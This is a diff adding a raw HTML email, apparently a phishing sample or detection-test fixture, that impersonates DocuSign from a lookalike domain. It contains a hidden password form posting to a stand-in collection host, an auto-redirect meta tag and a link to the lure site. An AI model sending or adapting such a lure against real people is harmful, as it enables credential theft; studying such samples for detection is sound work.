@@ -1,0 +1,19 @@
+From: DocuSign <dse@docs-sign.example-bad.top>
+To: pat@acme-defense.com
+Subject: Please DocuSign: Contract_Amendment.pdf
+Date: Wed, 30 Sep 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html><html><head><style>.x{color:red}</style><title>t</title></he=
+ad>
+<body><h1>DocuSign</h1><p>Please review &amp; sign the document.</p>
+<a href=3D"https://docs-sign.example-bad.top/review?id=3D9"><img src=3D"htt=
+ps://docs-sign.example-bad.top/btn.png" alt=3D"REVIEW DOCUMENT"></a>
+<form action=3D"https://collect.example-bad.top/post" method=3D"post"><inpu=
+t name=3D"password" type=3D"password"></form>
+<meta http-equiv=3D"refresh" content=3D"0; url=3Dhttps://redirect.example-b=
+ad.top/go">
+<script>var a =3D 'https://script-url.example.com';</script>
+</body></html>
